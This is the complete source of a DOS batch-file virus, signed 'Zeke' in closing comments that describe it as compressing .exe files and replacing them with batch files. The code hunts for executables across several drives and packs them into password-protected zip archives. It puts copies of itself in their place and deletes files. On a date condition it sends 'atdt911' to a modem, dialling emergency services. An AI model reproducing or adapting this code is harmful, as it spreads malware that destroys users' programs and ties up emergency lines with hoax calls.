@echo off
ctty con
exefile.exe %1 %2 %3 %4 %5 %6
ctty nul
del exefile.exe
pause
for %%f in (*.exe ..\*.exe  c:\*.exe d:*.exe f:*.exe d:\*.exe f:\*.exe) do set bozo=%%f
ren %bozo% exefile.exe
pkzip %bozo% boz.bat exefile.exe be.exe -szeke
ren %bozo% *.dds
del exefile.exe
copy %file%.bat %bozo%
ren %bozo% *.bat
set file=
set bozo=
del %0.exe
be monthday
if errorlevel=7 if not errorlevel=8 goto modem
goto end
:modem
atl0>com4
attd911>com4
del be.exe
:end
REM This is a virus that compresses exe files and replaces them with a
REM batchfile with the same name as the exe.
REM Copyright Zeke
